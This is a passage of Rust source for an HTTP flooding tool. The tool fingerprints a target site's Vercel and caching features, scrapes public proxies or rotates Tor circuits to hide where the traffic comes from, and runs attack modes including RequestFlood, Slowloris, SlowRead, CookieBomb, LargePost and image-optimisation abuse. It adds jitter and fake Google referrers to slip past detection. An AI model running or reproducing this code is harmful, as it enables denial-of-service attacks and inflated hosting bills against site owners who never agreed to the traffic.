            status_other: Arc::new(AtomicU64::new(0)),
            latency_samples: Arc::new(LatencySamples::new(16384)),
            concurrency: Arc::new(AtomicUsize::new(20)),
        }
    }
}

#[allow(dead_code)]
struct AppState {
    mode: ProxyMode, stats: Stats, iteration: u64,
    status_msg: String, proxy_status: Vec<(String, String)>,
    total_alive: usize, total_working: usize, total_scraped: usize,
    scrape_phase: u32, scrape_total: u32, tcp_checked: u32, tcp_total: u32,
    validated: u32, validation_total: u32, target_url: String,
    attack_mode: AttackMode, max_scrape: usize, load_concurrency: usize,
    interval_ms: u64, jitter_ms: u64, tcp_concurrency: usize,
    validate_concurrency: usize, validate_timeout_secs: u64,
    probe_status: String, has_image_opt: bool, has_api: bool, has_middleware: bool,
    is_vercel: bool, vercel_plan: String,
    has_isr: bool, has_cache_bypass: bool, has_edge_config: bool, has_log_drains: bool, has_storage: bool,
    imgs: Vec<String>, apis: Vec<String>, statics: Vec<String>,
    sessions: Arc<Vec<std::sync::Mutex<String>>>,
    client_config: ClientConfig,
    custom_selector: Option<String>,
}

impl AppState {
    fn new() -> Self { AppState {
        mode: ProxyMode::Scrape, stats: Stats::new(), iteration: 0,
        status_msg: "Ready".to_string(), proxy_status: vec![],
        total_alive: 0, total_working: 0, total_scraped: 0,
        scrape_phase: 0, scrape_total: 0, tcp_checked: 0, tcp_total: 0,
        validated: 0, validation_total: 0, target_url: DEFAULT_TARGET_URL.to_string(),
        attack_mode: AttackMode::Normal, max_scrape: 100_000, load_concurrency: 20,
        interval_ms: 10, jitter_ms: 50, tcp_concurrency: 500,
        validate_concurrency: 500, validate_timeout_secs: 1,
        probe_status: "Not probed".to_string(), has_image_opt: false, has_api: false,
        has_middleware: false, is_vercel: false, vercel_plan: String::new(),
        has_isr: false, has_cache_bypass: false, has_edge_config: false, has_log_drains: false, has_storage: false,
        imgs: vec![], apis: vec![], statics: vec![],
        sessions: Arc::new(Vec::new()),
        client_config: ClientConfig::default(),
        custom_selector: None,
    }}
}

fn url_join(base: &str, href: &str) -> String {
    let href = href.trim();
    if href.is_empty() || href.starts_with("data:") || href.starts_with("blob:") || href.starts_with("javascript:") || href.starts_with("#") { return String::new(); }
    if href.starts_with("http://") || href.starts_with("https://") { return href.to_string(); }
    if href.starts_with("//") { return format!("https:{}", href); }
    let base = base.trim_end_matches('/');
    if href.starts_with('/') { format!("{}{}", base, href.trim_start_matches('/')) } else { format!("{}{}", base, href) }
}

async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
    let config = {
        let st = state.lock().await;
        st.client_config.clone()
    };
    let c = browser_client_builder(&config).timeout(Duration::from_secs(5)).build().unwrap();
    let base = target_url.trim_end_matches('/');
    let mut vercel = false; let mut plan = String::new(); let mut middleware = false;
    let mut imgs: Vec<String> = vec![]; let mut apis: Vec<String> = vec![]; let mut statics: Vec<String> = vec![]; let mut imgopt = false;
    let mut isr = false; let mut cache_bypass = false; let mut edge_config = false; let mut html = String::new();

    if let Ok(r) = browser_request(c.get(base)).send().await {
        let hdrs = r.headers();
        vercel = hdrs.get("server").and_then(|v| v.to_str().ok()).map(|s| s.contains("Vercel")).unwrap_or(false);
        if let Some(id) = hdrs.get("x-vercel-id").and_then(|v| v.to_str().ok()) { plan = format!("Vercel ({})", id.split("::").next().unwrap_or("")); }
        if hdrs.get("server").and_then(|v| v.to_str().ok()).map(|s| s.contains("cloudflare")).unwrap_or(false) { plan = "Cloudflare".to_string(); }
        middleware = hdrs.keys().any(|k| {
            let ks = k.as_str().to_lowercase();
            ks.starts_with("x-middleware-") || ks == "x-middleware-next" || ks == "x-middleware-request"
        });
        edge_config = hdrs.keys().any(|k| {
            let ks = k.as_str().to_lowercase();
            ks.starts_with("x-vercel-edge-config-") || ks.starts_with("x-edge-config-")
        });
        if let Some(cache) = hdrs.get("x-vercel-cache").and_then(|v| v.to_str().ok()) { isr = cache == "REVALIDATED"; }
        if hdrs.get("x-nextjs-cache").is_some() { isr = true; }
        if let Ok(body) = r.text().await { html = body; }
    }

    if vercel {
        if let Ok(r1) = browser_request(c.get(&format!("{}?_cb={}", base, rand::random::<u64>()))).send().await {
            if let Some(cache) = r1.headers().get("x-vercel-cache").and_then(|v| v.to_str().ok()) {
                cache_bypass = cache == "MISS" || cache == "STALE";
            }
        }
    }

    if !html.is_empty() {
        let doc = Html::parse_document(&html);
        for sel in & [("link[href]", "href"), ("script[src]", "src"), ("img[src]", "src")] {
            let s = Selector::parse(sel.0).unwrap();
            for el in doc.select(&s) { if let Some(v) = el.value().attr(sel.1) { let j = url_join(base, v); if !j.is_empty() { statics.push(j); } } }
        }
        let src_sel = Selector::parse("source[srcset]").unwrap();
        for el in doc.select(&src_sel) {
            if let Some(srcset) = el.value().attr("srcset") {
                let first = srcset.split(',').next().unwrap_or("").trim().split_whitespace().next().unwrap_or("");
                let j = url_join(base, first); if !j.is_empty() { statics.push(j); }
            }
        }
    }
    for path in & ["/favicon.ico", "/favicon.svg", "/favicon.png"] { let f = format!("{}{}", base, path); if !statics.contains(&f) { statics.push(f); } }
    statics.sort(); statics.dedup();

    // Concurrently verify statics
    let mut verified_statics: Vec<String> = vec![];
    let sem = Arc::new(Semaphore::new(10));
    let mut join_handles = vec![];
    for path in statics {
        let sem_clone = sem.clone();
        let c_clone = c.clone();
        let path_clone = path.clone();
        let vercel_clone = vercel;
        join_handles.push(tokio::spawn(async move {
            let _permit = sem_clone.acquire().await.unwrap();
            let mut is_img = false;
            let mut is_img_opt = false;
            let mut is_ok = false;
            if let Ok(r) = browser_request(c_clone.get(&path_clone)).send().await {
                if r.status().as_u16() < 400 {
                    let sz = r.bytes().await.map(|b| b.len()).unwrap_or(0);
                    if sz > 0 {
                        is_ok = true;
                        let lower = path_clone.to_lowercase();
                        if lower.contains(".jpg") || lower.contains(".jpeg") || lower.contains(".png") || lower.contains(".webp") || lower.contains(".gif") || lower.contains(".svg") {
                            is_img = true;
                            if vercel_clone {
                                if let Ok(r2) = browser_request(c_clone.get(&format!("{}?width=300", path_clone))).send().await {
                                    let sz2 = r2.bytes().await.map(|b| b.len()).unwrap_or(0);
                                    if sz2 > 0 && sz2 != sz {
                                        is_img_opt = true;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            (path_clone, is_ok, is_img, is_img_opt)
        }));
    }
    for h in join_handles {
        if let Ok((path, is_ok, is_img, is_img_opt)) = h.await {
            if is_ok {
                verified_statics.push(path.clone());
                if is_img {
                    imgs.push(path);
                    if is_img_opt {
                        imgopt = true;
                    }
                }
            }
        }
    }

    // Concurrently verify APIs
    let api_paths = ["/api/chat", "/api/health", "/api/status", "/api/products", "/api/generate"];
    let mut api_handles = vec![];
    for path in api_paths {
        let c_clone = c.clone();
        let url = format!("{}{}", base, path);
        api_handles.push(tokio::spawn(async move {
            if let Ok(r) = browser_request(c_clone.get(&url)).send().await {
                if r.status().as_u16() < 400 {
                    return Some(path.to_string());
                }
            }
            None
        }));
    }
    for h in api_handles {
        if let Ok(Some(path)) = h.await {
            apis.push(path);
        }
    }
    
    let mut status = String::new();
    if !plan.is_empty() { status.push_str(&format!("{} | ", plan)); } else if vercel { status.push_str("Vercel | "); } else { status.push_str("Unknown | "); }
    if !verified_statics.is_empty() { status.push_str(&format!("{} assets ✅ ", verified_statics.len())); }
    if imgopt { status.push_str("ImgOpt ✅ "); }
    if !apis.is_empty() { status.push_str(&format!("{} APIs ✅ ", apis.len())); }
    if middleware { status.push_str("MW ✅ "); }
    if isr { status.push_str("ISR ✅ "); }
    if cache_bypass { status.push_str("CacheBypass ✅ "); }
    if edge_config { status.push_str("EdgeCfg ✅ "); }
    if vercel { status.push_str("LogDrain 🔸 "); }
    if verified_statics.is_empty() && !imgopt && apis.is_empty() && !middleware { status.push_str("Empty/unreachable"); }

    let mut st = state.lock().await;
    st.probe_status = status; st.is_vercel = vercel; st.vercel_plan = plan; st.has_image_opt = imgopt; st.has_api = !apis.is_empty(); st.has_middleware = middleware;
    st.has_isr = isr; st.has_cache_bypass = cache_bypass; st.has_edge_config = edge_config; st.has_log_drains = vercel; st.has_storage = false;
    st.imgs = imgs; st.apis = apis; st.statics = verified_statics;
}

async fn filter_alive_proxies(proxies: &[String], state: &Arc<Mutex<AppState>>) -> Vec<String> {
    let to = 1u64;
    let tc = 1000usize;
    let total = proxies.len();
    state.lock().await.tcp_total = total as u32;
    state.lock().await.status_msg = format!("TCP check {}...", total);
    let sem = Arc::new(Semaphore::new(tc));
    let a = Arc::new(Mutex::new(Vec::new()));
    let d = Arc::new(AtomicUsize::new(0));
    let s2 = Arc::clone(state);
    let mut h = Vec::with_capacity(total);
    for p in proxies.to_owned() {
        let permit = Arc::clone(&sem).acquire_owned().await.unwrap();
        let aa = Arc::clone(&a);
        let dd = Arc::clone(&d);
        let ss = Arc::clone(&s2);
        h.push(tokio::spawn(async move {
            if tcp_check(&p, to).await {
                aa.lock().await.push(p);
            }
            let n = dd.fetch_add(1, Ordering::Relaxed) + 1;
            if n % 500 == 0 || n == total {
                ss.lock().await.tcp_checked = n as u32;
                ss.lock().await.status_msg = format!("TCP: {}/{}", n, total);
            }
            drop(permit);
        }));
    }
    for x in h {
        let _ = x.await;
    }
    let alive_result = a.lock().await.clone();
    alive_result
}

async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Vec<String>> {
    match mode {
        ProxyMode::Tor => {
            state.lock().await.status_msg = "Checking Tor...".to_string();
            let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
            if ok {
                let n = state.lock().await.load_concurrency.min(20);
                let mut p = Vec::with_capacity(n);
                for i in 0..n { p.push(format!("socks5://tor{}:isolate@127.0.0.1:9050", i)); }
                state.lock().await.status_msg = format!("Tor ready, {} circuits", n);
                Some(p)
            } else if let Ok(custom) = std::env::var("TOR_PROXY") {
                let base = custom.trim_end_matches('?').trim_end_matches('/');
                let base = if let Some(pos) = base.find('@') { &base[pos+1..] } else { base };
                let n = state.lock().await.load_concurrency.min(20);
                let mut p = Vec::with_capacity(n);
                for i in 0..n { p.push(format!("socks5://tor{}:isolate@{}", i, base)); }
                state.lock().await.status_msg = format!("Using TOR_PROXY: {} ({} circuits)", base, n);
                Some(p)
            } else {
                state.lock().await.status_msg = "Tor unavailable".to_string();
                None
            }
        }
        ProxyMode::Scrape | ProxyMode::ScrapeTorFallback => {
            state.lock().await.status_msg = "Scraping proxies...".to_string();
            let config = {
                let st = state.lock().await;
                st.client_config.clone()
            };
            let c = browser_client_builder(&config).timeout(Duration::from_secs(15)).build().unwrap();
            let scraped = match tokio::time::timeout(Duration::from_secs(30), scrape_all(&c, state)).await {
                Ok(res) => res,
                Err(_) => {
                    let mut st = state.lock().await;
                    st.status_msg = "Proxy scraping timed out".to_string();
                    vec![]
                }
            };
            if scraped.is_empty() {
                if mode == ProxyMode::ScrapeTorFallback { /* fall through to Tor */ }
                else { state.lock().await.status_msg = "No proxies scraped".to_string(); return None; }
            }
            state.lock().await.status_msg = format!("{} proxies scraped", scraped.len());
            state.lock().await.total_scraped = scraped.len();
            let sample: Vec<String> = scraped.into_iter().take(2000).collect();
            let alive = filter_alive_proxies(&sample, state).await;
            state.lock().await.total_alive = alive.len(); state.lock().await.status_msg = format!("TCP alive: {}", alive.len());
            let mut result = alive;
            result.sort(); result.dedup();
            if result.is_empty() && mode == ProxyMode::ScrapeTorFallback {
                state.lock().await.status_msg = "Scrape failed, Tor fallback...".to_string();
                if tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some() {
                    let n = state.lock().await.load_concurrency.min(20);
                    let mut p = Vec::with_capacity(n);
                    for i in 0..n { p.push(format!("socks5://tor{}:isolate@127.0.0.1:9050", i)); }
                    return Some(p);
                } else { state.lock().await.status_msg = "Tor fallback unavailable".to_string(); return None; }
            }
            if result.is_empty() { None } else { result.sort(); result.dedup(); Some(result) }
        }
    }
}

async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyPool>>, stats: Stats, delay_ms: u64, max_errors: Option<u64>) {
    let (mut conc, interval, attack, sessions, _, apis, _statics) = {
        let st = state.lock().await;
        (st.load_concurrency, st.interval_ms, st.attack_mode, st.sessions.clone(), st.jitter_ms, st.apis.clone(), st.statics.clone())
    };
    let mut jitter_ms;
    let mut semaphore = Arc::new(Semaphore::new(conc));

    loop {
        if max_errors.is_some() && stats.errors.load(Ordering::Relaxed) >= max_errors.unwrap() {
            println!("  Max errors ({}) reached, stopping.", max_errors.unwrap());
            break;
        }
        if !stats.running.load(Ordering::Relaxed) { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
        
        let (new_conc, new_jitter, target_url) = {
            let st = state.lock().await;
            (st.load_concurrency, st.jitter_ms, st.target_url.clone())
        };
        if target_url.is_empty() { tokio::time::sleep(Duration::from_millis(100)).await; continue; }
        let _ = Url::parse(&target_url).ok();

        if new_conc != conc {
            conc = new_conc;
            semaphore = Arc::new(Semaphore::new(conc));
        }
        jitter_ms = new_jitter;

        let (imgs, apis_local, statics_local, _has_isr, _has_cache_bypass, _has_log_drains, _has_storage) = {
            let st = state.lock().await; (st.imgs.clone(), st.apis.clone(), st.statics.clone(), st.has_isr, st.has_cache_bypass, st.has_log_drains, st.has_storage)
        };
        let assets: Vec<String> = match attack {
            AttackMode::Normal => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
            AttackMode::ImageOpt => { if imgs.is_empty() { vec!["/".into()] } else { imgs.clone() } },
            AttackMode::SSR => { if apis_local.is_empty() { vec!["/".into()] } else { apis_local.clone() } },
            AttackMode::Middleware => { if statics_local.is_empty() { vec!["/".into()] } else { statics_local.clone() } },
            _ => vec!["/".into()]
        };

        loop {
            if !stats.running.load(Ordering::Relaxed) { break; }
            let active_concurrency = stats.concurrency.load(Ordering::Relaxed);
            if active_concurrency != conc {
                break; // Recreate semaphore
            }
            
            let _permit = semaphore.clone().acquire_owned().await.unwrap();
            let next_client = {
                let mut p_lock = pool.lock().unwrap();
                p_lock.next()
            };
            if let Some((idx, client)) = next_client {
                let stats_clone = stats.clone();
                let assets = assets.clone();
                let attack = attack;
                let target = target_url.clone();
                let sessions_clone = sessions.clone();
                let idx1 = rand::rng().random_range(0..assets.len());
                let pool_clone = pool.clone();
                let apis_clone = apis.clone();
                
                // Determine latency and delay details
                let mut req_delay = delay_ms;
                if req_delay == 0 {
                    req_delay = interval;
                }
                if jitter_ms > 0 {
                    let mut rng = rand::rng();
                    let min_d = req_delay.saturating_sub(jitter_ms);
                    let max_d = req_delay.saturating_add(jitter_ms);
                    req_delay = rng.random_range(min_d..=max_d);
                }

                let _ = tokio::spawn(async move {
                    let start_req = Instant::now();
                    
                    // Realistic referrer trail / navigation funnel logic for Normal/AssetSpray
                    let (req_url, referrer) = if (attack == AttackMode::Normal || attack == AttackMode::AssetSpray) && !assets.is_empty() {
                        let step = rand::rng().random_range(0..3);
                        if step == 0 {
                            (target.clone(), Some("https://www.google.com/".to_string()))
                        } else if step == 1 {
                            (assets[idx1].clone(), Some(target.clone()))
                        } else {
                            let path = if !apis_clone.is_empty() {
                                apis_clone[rand::rng().random_range(0..apis_clone.len())].clone()
                            } else {
                                target.clone()
                            };
                            (path, Some(format!("{}/about", target.trim_end_matches('/'))))
                        }
                    } else {
                        (if assets.is_empty() { target.clone() } else { assets[idx1].clone() }, None)
                    };

                    let result = match attack {
                        AttackMode::Bandwidth | AttackMode::Normal => {
                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone()).await
                        }
                        AttackMode::SlowRead => {
                            fetch_slow(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await
                        }
                        AttackMode::ImageOpt => {
                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                            else { fetch_range(client, assets[idx1].clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                        }
                        AttackMode::LargePost => {
                            fetch_post(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await
                        }
                        AttackMode::AssetSpray => {
                            fetch_page_with_referrer(client, req_url, referrer, req_delay, idx, sessions_clone.clone()).await
                        }
                        AttackMode::RangeReq => {
                            if assets.is_empty() { fetch_range(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                            else { fetch_range(client, assets[idx1].clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                        }
                        AttackMode::CookieBomb => {
                            fetch_cookie(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await
                        }
                        AttackMode::SSR => {
                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                            else { fetch_page(client, assets[idx1].clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                        }
                        AttackMode::Middleware => {
                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                            else { fetch_page(client, assets[idx1].clone(), req_delay, 0, idx, sessions_clone.clone()).await }
                        }
                        AttackMode::RequestFlood => {
                            fetch_page(client, target.clone(), 0, 0, idx, sessions_clone.clone()).await
                        }
                        AttackMode::NotFound => {
                            let path = format!("/nonexistent-{:08x}", rand::random::<u32>());
                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), req_delay, 0, idx, sessions_clone.clone()).await
                        }
                        AttackMode::Slowloris => {
                            fetch_slowloris(client, target.clone(), req_delay, idx, sessions_clone.clone()).await
                        }
                    };
                    let latency = start_req.elapsed().as_millis() as u64;
                    stats_clone.latency_samples.record(latency as u32);
                    
                    match result {
                        Ok((bytes, status)) => {
                            stats_clone.total_requests.fetch_add(1, Ordering::Relaxed);
                            stats_clone.total_bytes.fetch_add(bytes as u64, Ordering::Relaxed);
                            stats_clone.total_latency_ms.fetch_add(latency, Ordering::Relaxed);
                            match status {
                                200..=299 => { stats_clone.status_2xx.fetch_add(1, Ordering::Relaxed); }
                                300..=399 => { stats_clone.status_3xx.fetch_add(1, Ordering::Relaxed); }
                                400..=499 => { stats_clone.status_4xx.fetch_add(1, Ordering::Relaxed); }
                                500..=599 => { stats_clone.status_5xx.fetch_add(1, Ordering::Relaxed); }
                                _ => { stats_clone.status_other.fetch_add(1, Ordering::Relaxed); }
                            }
                            pool_clone.lock().unwrap().report_success(idx, latency);
                        }
                        Err(_) => {
                            stats_clone.errors.fetch_add(1, Ordering::Relaxed);
                            pool_clone.lock().unwrap().report_failure(idx);
                        }
                    }
                });
                break;
            } else {
                tokio::time::sleep(Duration::from_millis(100)).await;
            }
        }
        
        tokio::time::sleep(Duration::from_millis(interval)).await;
    }
}

fn write_probe_csv(path: &str, target: &str, status: &str, proxies: &[String], concurrency: usize, attack: &str) {
    let status_escaped = status.replace(',', ";");
    let content = format!("target,status,proxy_count,concurrency,attack_mode\n{},{},{},{},{}\n", target, status_escaped, proxies.len(), concurrency, attack);
    std::fs::write(path, content).unwrap();
    println!("  CSV written to {}", path);
}

fn write_results_csv(path: &str, target: &str, status: &str, proxies: &[String], concurrency: usize, attack: &str, total_reqs: u64, total_bytes: u64, duration: u64) {
    let status_escaped = status.replace(',', ";");
    let content = format!("target,status,proxy_count,concurrency,attack_mode,total_requests,total_bytes,duration_sec,kb_per_sec\n{},{},{},{},{},{},{},{}{:.2}\n",
        target, status_escaped, proxies.len(), concurrency, attack,
        total_reqs, total_bytes, duration, total_bytes as f64 / duration as f64 / 1024.0);
    std::fs::write(path, content).unwrap();
    println!("  CSV written to {}", path);
}

async fn cycle_tor_circuit(control_addr: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut stream = tokio::net::TcpStream::connect(control_addr).await?;
    stream.write_all(b"AUTHENTICATE \"\"\r\n").await?;
    let mut buf = [0u8; 1024];
    let _ = stream.read(&mut buf).await?;
    stream.write_all(b"SIGNAL NEWNYM\r\n").await?;
    let _ = stream.read(&mut buf).await?;
    stream.write_all(b"QUIT\r\n").await?;
    Ok(())
}

async fn configure_tor(
    control_addr: &str,
    entry_guards: Option<&str>,
    bridges: Option<&str>,
    circuit_timeout: Option<u64>,
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let mut stream = tokio::net::TcpStream::connect(control_addr).await?;
    stream.write_all(b"AUTHENTICATE \"\"\r\n").await?;
    let mut buf = [0u8; 1024];
    let _ = stream.read(&mut buf).await?;

    if let Some(guards) = entry_guards {
        let cmd = format!("SETCONF EntryNodes=\"{}\" StrictNodes=1\r\n", guards);
        stream.write_all(cmd.as_bytes()).await?;
        let _ = stream.read(&mut buf).await?;
    }

    if let Some(brs) = bridges {
        let mut cmd = "SETCONF UseBridges=1".to_string();
        for br in brs.split(';') {
            let trimmed = br.trim();
            if !trimmed.is_empty() {
                cmd.push_str(&format!(" Bridge=\"{}\"", trimmed));
            }
        }
        cmd.push_str("\r\n");
        stream.write_all(cmd.as_bytes()).await?;
        let _ = stream.read(&mut buf).await?;
    }

    if let Some(timeout) = circuit_timeout {
        let cmd = format!("SETCONF CircuitBuildTimeout={}\r\n", timeout);
        stream.write_all(cmd.as_bytes()).await?;
        let _ = stream.read(&mut buf).await?;
    }

    stream.write_all(b"QUIT\r\n").await?;
    Ok(())
}

async fn resolve_target_dns(target_url: &str) -> Option<std::net::IpAddr> {
    let u = Url::parse(target_url).ok()?;
    let host = u.host_str()?;
    if host.contains("localhost") || host.contains("127.0.0.1") || host.ends_with(".onion") {
        return None;
    }
    let addrs = tokio::net::lookup_host(format!("{}:443", host)).await.ok()?;
    for addr in addrs {
        return Some(addr.ip());
    }
    None
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = std::env::args().collect();
    // Parse flags
    let mut tor_only = false;
    let mut dry_run = false;
    let mut verify = false;
    let mut version = false;
    let mut list_modes = false;
    let mut save_proxies: Option<String> = None;
    let mut output_csv: Option<String> = None;
    let mut proxy_file: Option<String> = None;
    let mut tor_proxy: Option<String> = None;
    let mut delay_ms: u64 = 0;
    let mut max_errors: Option<u64> = None;
    let mut config_file: Option<String> = None;
    let mut positional: Vec<String> = Vec::new();

    // New configuration variables
    let mut custom_selector: Option<String> = None;
    let mut pool_max_idle = 20usize;
    let mut pool_idle_timeout_secs = 90u64;
    let mut tor_control = "127.0.0.1:9051".to_string();
    let mut tor_entry_guards: Option<String> = None;
    let mut tor_bridges: Option<String> = None;
    let mut tor_circuit_timeout: Option<u64> = None;
    let mut tor_ssthresh = 20usize;
    let mut sni: Option<String> = None;
    let mut jitter_ms = 0u64;
    let mut auto_tune = false;
    let mut tui = false;

    let mut args_iter = args.into_iter().skip(1);
    while let Some(arg) = args_iter.next() {
        match arg.as_str() {
            "-h" | "--help" => {
                print_help();
                return;
            }
            "-v" | "--version" => version = true,
            "--list-modes" => list_modes = true,
            "--tor-only" => tor_only = true,
            "--verify" => verify = true,
            "--dry-run" => dry_run = true,
            "--output" => {
                if let Some(val) = args_iter.next() {
                    output_csv = Some(val);
                }
            }
            "--proxy-file" => {
                if let Some(val) = args_iter.next() {
                    proxy_file = Some(val);
                }
            }
            "--tor-proxy" => {
                if let Some(val) = args_iter.next() {
                    tor_proxy = Some(val);
                }
            }
            "--delay" => {
                if let Some(val) = args_iter.next() {
                    delay_ms = val.parse().unwrap_or(0);
                }
            }
            "--max-errors" => {
                if let Some(val) = args_iter.next() {
                    max_errors = val.parse().ok();
                }
            }
            "--save-proxies" => {
                if let Some(val) = args_iter.next() {
                    save_proxies = Some(val);
                }
            }
            "--config" => {
                if let Some(val) = args_iter.next() {
                    config_file = Some(val);
                }
            }
            "--custom-selector" => {
                if let Some(val) = args_iter.next() {
                    custom_selector = Some(val);
                }
            }
            "--pool-max-idle" => {
                if let Some(val) = args_iter.next() {
                    pool_max_idle = val.parse().unwrap_or(20);
                }
            }
            "--pool-idle-timeout" => {
                if let Some(val) = args_iter.next() {
                    pool_idle_timeout_secs = val.parse().unwrap_or(90);
                }
            }
            "--tor-control" => {
                if let Some(val) = args_iter.next() {
                    tor_control = val;
                }
            }
            "--tor-entry-guards" => {
                if let Some(val) = args_iter.next() {
                    tor_entry_guards = Some(val);
                }
            }
            "--tor-bridges" => {
                if let Some(val) = args_iter.next() {
                    tor_bridges = Some(val);
                }
            }
            "--tor-circuit-timeout" => {
                if let Some(val) = args_iter.next() {
                    tor_circuit_timeout = val.parse().ok();
                }
            }
            "--tor-ssthresh" => {
                if let Some(val) = args_iter.next() {
                    tor_ssthresh = val.parse().unwrap_or(20);
                }
            }
            "--sni" => {
                if let Some(val) = args_iter.next() {
                    sni = Some(val);
                }
            }
            "--jitter" => {
                if let Some(val) = args_iter.next() {
                    jitter_ms = val.parse().unwrap_or(0);
                }
            }
            "--auto-tune" => auto_tune = true,
            "--tui" => tui = true,
            other => {
                if other.starts_with("--output=") {
                    output_csv = Some(other.strip_prefix("--output=").unwrap().to_string());
                } else if other.starts_with("--proxy-file=") {
                    proxy_file = Some(other.strip_prefix("--proxy-file=").unwrap().to_string());
                } else if other.starts_with("--tor-proxy=") {
                    tor_proxy = Some(other.strip_prefix("--tor-proxy=").unwrap().to_string());
                } else if other.starts_with("--delay=") {
                    delay_ms = other.strip_prefix("--delay=").unwrap().parse().unwrap_or(0);
                } else if other.starts_with("--max-errors=") {
                    max_errors = other.strip_prefix("--max-errors=").unwrap().parse().ok();
                } else if other.starts_with("--save-proxies=") {
                    save_proxies = Some(other.strip_prefix("--save-proxies=").unwrap().to_string());
                } else if other.starts_with("--config=") {
                    config_file = Some(other.strip_prefix("--config=").unwrap().to_string());
                } else if other.starts_with("--custom-selector=") {
                    custom_selector = Some(other.strip_prefix("--custom-selector=").unwrap().to_string());
                } else if other.starts_with("--pool-max-idle=") {
                    pool_max_idle = other.strip_prefix("--pool-max-idle=").unwrap().parse().unwrap_or(20);
                } else if other.starts_with("--pool-idle-timeout=") {
                    pool_idle_timeout_secs = other.strip_prefix("--pool-idle-timeout=").unwrap().parse().unwrap_or(90);
                } else if other.starts_with("--tor-control=") {
                    tor_control = other.strip_prefix("--tor-control=").unwrap().to_string();
                } else if other.starts_with("--tor-entry-guards=") {
                    tor_entry_guards = Some(other.strip_prefix("--tor-entry-guards=").unwrap().to_string());
                } else if other.starts_with("--tor-bridges=") {
                    tor_bridges = Some(other.strip_prefix("--tor-bridges=").unwrap().to_string());
                } else if other.starts_with("--tor-circuit-timeout=") {
                    tor_circuit_timeout = other.strip_prefix("--tor-circuit-timeout=").unwrap().parse().ok();
                } else if other.starts_with("--tor-ssthresh=") {
                    tor_ssthresh = other.strip_prefix("--tor-ssthresh=").unwrap().parse().unwrap_or(20);
                } else if other.starts_with("--sni=") {
                    sni = Some(other.strip_prefix("--sni=").unwrap().to_string());
                } else if other.starts_with("--jitter=") {
                    jitter_ms = other.strip_prefix("--jitter=").unwrap().parse().unwrap_or(0);
                } else if other == "--auto-tune" {
                    auto_tune = true;
                } else if other == "--tui" {
                    tui = true;
                } else if other.starts_with('-') {
                    eprintln!("Unknown option: {}", other);
                    std::process::exit(1);
                } else {
                    positional.push(other.to_string());
                }
            }
        }
    }

    let mut target_url = positional.get(0).cloned().unwrap_or_else(|| DEFAULT_TARGET_URL.to_string());
    let mut mode_str = positional.get(1).cloned().unwrap_or_else(|| "scrape".to_string());
    let mut attack_str = positional.get(2).cloned().unwrap_or_else(|| "normal".to_string());
    let mut concurrency: usize = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(20);
    let mut duration_secs: u64 = positional.get(4).and_then(|s| s.parse().ok()).unwrap_or(30);

    // Load configurations from config file if supplied
    if let Some(path) = &config_file {
        if let Ok(content) = std::fs::read_to_string(path) {
            println!("  Loading config from {}...", path);
            for line in content.lines() {
                let trimmed = line.trim();
                if trimmed.is_empty() || trimmed.starts_with('#') { continue; }
                if let Some(pos) = trimmed.find('=') {
                    let key = trimmed[..pos].trim();
                    let val = trimmed[pos+1..].trim();
                    match key {
                        "target_url" | "target" => target_url = val.to_string(),
                        "mode" => mode_str = val.to_string(),
                        "attack" | "attack_mode" => attack_str = val.to_string(),
                        "concurrency" => if let Ok(parsed) = val.parse() { concurrency = parsed; },
                        "duration" | "duration_secs" => if let Ok(parsed) = val.parse() { duration_secs = parsed; },
                        "delay" | "delay_ms" => if let Ok(parsed) = val.parse() { delay_ms = parsed; },
                        "max_errors" => max_errors = val.parse().ok(),
                        "proxy_file" => proxy_file = Some(val.to_string()),
                        "tor_proxy" => tor_proxy = Some(val.to_string()),
                        "tor_entry_guards" => tor_entry_guards = Some(val.to_string()),
                        "tor_bridges" => tor_bridges = Some(val.to_string()),
                        "tor_circuit_timeout" => tor_circuit_timeout = val.parse().ok(),
                        "tor_ssthresh" => if let Ok(parsed) = val.parse() { tor_ssthresh = parsed; },
                        "save_proxies" => save_proxies = Some(val.to_string()),
                        "output_csv" | "output" => output_csv = Some(val.to_string()),
                        "custom_selector" => custom_selector = Some(val.to_string()),
                        "pool_max_idle" => if let Ok(parsed) = val.parse() { pool_max_idle = parsed; },
                        "pool_idle_timeout" => if let Ok(parsed) = val.parse() { pool_idle_timeout_secs = parsed; },
                        "tor_control" => tor_control = val.to_string(),
                        "sni" => sni = Some(val.to_string()),
                        "jitter" | "jitter_ms" => if let Ok(parsed) = val.parse() { jitter_ms = parsed; },
                        "auto_tune" => auto_tune = val.parse().unwrap_or(false),
                        "tui" => tui = val.parse().unwrap_or(false),
                        _ => {}
                    }
                }
            }
        } else {
            eprintln!("  Warning: Config file {} not found or unreadable.", path);
        }
    }

    // Initialize DNS pinning and ClientConfig
    let pinned_ip = resolve_target_dns(&target_url).await;
    let config = ClientConfig {
